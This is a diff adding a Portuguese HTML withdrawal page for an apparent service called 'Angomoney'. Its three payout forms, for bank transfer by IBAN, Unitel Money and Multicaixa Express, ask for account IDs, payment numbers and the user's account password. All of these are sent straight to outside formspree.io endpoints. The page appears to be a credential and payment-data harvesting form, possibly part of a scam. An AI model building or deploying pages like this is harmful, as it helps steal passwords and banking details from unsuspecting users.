@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retirar</title>
+    <style>
+        body {
+            background-color: #1a1a2e;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 95vh;
+            flex-direction: column;
+        }
+        .container {
+            background-color: #222;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+        }
+        h2 {
+            text-align: center;
+        }
+        .cards {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .card {
+            background-color: #444;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            flex: 1;
+            margin: 0 5px;
+        }
+        .card:hover {
+            background-color: #666;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input, select {
+            width: 300px;
+            padding: 10px;
+            border-radius: 5px;
+            border: none;
+            margin-bottom: 15px;
+        }
+        .button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .button.primary {
+            background-color: #28a745;
+            color: white;
+        }
+        .button.primary:hover {
+            background-color: #218838;
+        }
+        .button.secondary {
+            background-color: #007bff;
+            color: white;
+        }
+        .button.secondary:hover {
+            background-color: #0056b3;
+        }
+        .button.back {
+            background-color: #dc3545;
+            color: white;
+            margin-top: 10px;
+        }
+        .button.back:hover {
+            background-color: #c82333;
+        }
+    </style>
+    <script>
+        function showForm(method) {
+            let formContent = '';
+            if (method === 'Transferência Bancária') {
+                formContent = `
+                <center>
+                 <form action="https://formspree.io/f/mqaeyyjy" method="POST">
+                        <label>ID da sua Conta Angomoney</label>
+                        <input type="tel" name="ID:" required maxlength="3">
+                        <label>Nome completo</label>
+                        <input type="text" name="Nome completo:" required>
+                        <label>IBAN</label>
+                        <input type="tel" name="iban" required minlength="21" maxlength="21">
+                        <label>Valor</label>
+                        <input type="tel" name="Valor a levantar:" required minlength="3" maxlength="5">
+                        <label>Sua senha da Angomoney</label>
+                        <input type="password" name="Senha" required>
+                        <button type="submit" class="button secondary">Retirar</button>
+                        <button type="button" class="button back" onclick="window.location.href='index.html'">Voltar</button>
+                    </form>
+                </center>`;
+            } else if (method === 'Unitel Money') {
+                formContent = `
+                <center>
+                  <form action="https://formspree.io/f/mzzdjjwo" method="POST">
+                        <label>ID da sua Conta Angomoney</label>
+                        <input type="tel" name="ID" required maxlength="3">
+                        <label>Número da Unitel Money</label>
+                        <input type="tel" name="Numero da UNITEL MONEY:" required maxlength="9">
+                        <label>Valor</label>
+                        <input type="tel" name="valor do levantamento:" required minlength="3" maxlength="5">
+                        <label>Sua senha da Angomoney</label>
+                        <input type="password" name="Senha" required>
+                        <button type="submit" class="button primary">Confirmar Levantamento</button>
+                        <button type="button" class="button back" onclick="window.location.href='index.html'">Voltar</button>
+                    </form>
+                </center>`;
+            } else if (method === 'Multicaixa Express') {
+                formContent = `
+                <center>
+                   <form  action="https://formspree.io/f/mldgppvo" method="POST" >
+                        <label>ID da sua Conta Angomoney</label>
+                        <input type="tel" name="ID" required maxlength="3">
+                        <label>Número do Multicaixa Express</label>
+                        <input type="text" name="Numero do express:" required>
+                        <label>Valor</label>
+                        <input type="number" name="valor do levantamento" required>
+                        <label>Sua senha da Angomoney</label>
+                        <input type="password" name="Senha" required>
+                        <button type="submit" class="button primary">Processar Pagamento</button>
+                        <button type="button" class="button back" onclick="window.location.href='index.html'">Voltar</button>
+                    </form>
+                </center>`;
+            }
+            document.getElementById('formContainer').innerHTML = `<h2>Retirar - ${method}</h2>` + formContent;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="cards">
+            <div class="card" onclick="showForm('Transferência Bancária')">Transferência Bancária</div>
+            <div class="card" onclick="showForm('Unitel Money')">Unitel Money</div>
+            <div class="card" onclick="showForm('Multicaixa Express')">Multicaixa Express</div>
+        </div>
+        <div id="formContainer">
+            <h2>Retirar</h2>
+            <p>Selecione um método de pagamento acima.</p>
+            <button type="button" class="button back" onclick="window.location.href='index.html'">Voltar</button>
+        </div>
+    </div>
+</body>
+</html>
+
+
